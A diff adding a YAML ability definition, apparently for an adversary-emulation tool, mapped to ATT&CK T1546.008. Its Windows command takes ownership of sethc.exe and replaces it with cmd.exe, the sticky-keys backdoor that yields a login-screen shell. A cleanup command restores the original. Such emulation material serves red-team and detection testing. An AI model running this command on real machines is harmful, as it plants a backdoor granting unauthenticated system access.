@@ -1,0 +1,19 @@
+---
+- id: 84942e0bfed7ce40449941faec766c5e
+  name: Replace binary of sticky keys
+  description: 'Replace sticky keys binary (sethc.exe) with cmd.exe
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1546.008
+    name: 'Event Triggered Execution: Accessibility Features'
+  platforms:
+    windows:
+      cmd:
+        command: IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe
+          C:\Windows\System32\sethc_backup.exe) ELSE ( pushd ) && takeown /F C:\Windows\System32\sethc.exe
+          /A && icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t &&
+          copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+        payloads: []
+        cleanup: copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
